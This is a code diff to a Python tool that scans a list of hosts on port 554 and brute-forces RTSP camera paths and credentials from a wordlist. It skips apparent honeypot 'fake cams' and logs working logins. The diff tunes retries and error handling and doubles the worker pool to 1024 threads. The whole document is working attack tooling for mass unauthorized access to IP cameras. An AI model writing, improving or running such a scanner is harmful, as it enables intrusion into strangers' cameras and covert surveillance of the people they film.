@@ -18,7 +18,7 @@ def wrire_result(res):
         f.write(f'[{tim()}] {res}\n')
 
 
-def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 5):
+def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 10):
     if cred:
         cred += '@'
     req = (
@@ -26,7 +26,7 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
         'CSeq: 2\r\n'
         '\r\n'
     )
-    tries = 5
+    tries = 4
     while True:
         try:
             with so.socket() as s:
@@ -36,29 +36,35 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
                 response = s.recv(1024).decode()
                 return int(status_re.findall(response)[0])
         except so.timeout:
-            return 503  # slowpoke, 3ff0ff
+            break  # slowpoke, 3ff0ff
         except IOError as e:
             # 111 refused
             if e.errno == 111:
-                return 503
+                break
 
             # 104 reset by peer
             if e.errno == 104:
                 if tries <= 0:
                     # print('u', end='', flush=True)
-                    return 503  # host f*ckup?
-                sleep(1 / tries)
+                    break  # host f*ckup?
+                sleep(2 / tries)
                 tries -= 1
                 continue
-            print(e)
-            sleep(0.15)  # potential  too many open files
+
+            # too many open files
+            if e.errno == 24:
+                sleep(0.15)
+                continue
+            break
+
         except KeyboardInterrupt:
             raise
         except IndexError:
-            return 503
+            break
         except Exception as e:
             print('Unknown error:', e, 'please, contact with dev')
             return 418
+    return 503
 
 
 def check_cred(host, port, path, cred):
@@ -82,7 +88,7 @@ def check_path(host, port, path):
         return
 
     if code not in [200, 401, 403]:
-        print('.', end='', flush=True)
+        # print('.', end='', flush=True)
         return ''
 
     with open('./data/rtsp_creds.txt') as f:
@@ -90,7 +96,7 @@ def check_path(host, port, path):
 
     ch = partial(check_cred, host, port, path)
 
-    with TPE(4) as ex:
+    with TPE(1) as ex:
         for res in ex.map(ch, creds):
             if res is None:
                 return
@@ -108,11 +114,12 @@ def check_host(host):
         for rr in ex.map(ch, paths):
             if rr is None:
                 return
-            if rr:
-                if '0h84d' in rr:
-                    print('f', end='', flush=True)  # fake cam
-                    return
 
+            if '0h84d' in rr:
+                print('~', end='', flush=True)  # fake cam
+                return
+
+            if rr:
                 wrire_result(rr)
                 print('@', end='', flush=True)
                 return rr  # first valid path is enough now
@@ -122,7 +129,7 @@ def main():
     with open('./local/hosts_554.txt') as f:
         hosts = [ln.rstrip() for ln in f]
 
-    with TPE(512) as ex:
+    with TPE(1024) as ex:
         results = ex.map(check_host, hosts)
         for i, res in enumerate(list(results)):
             if res:
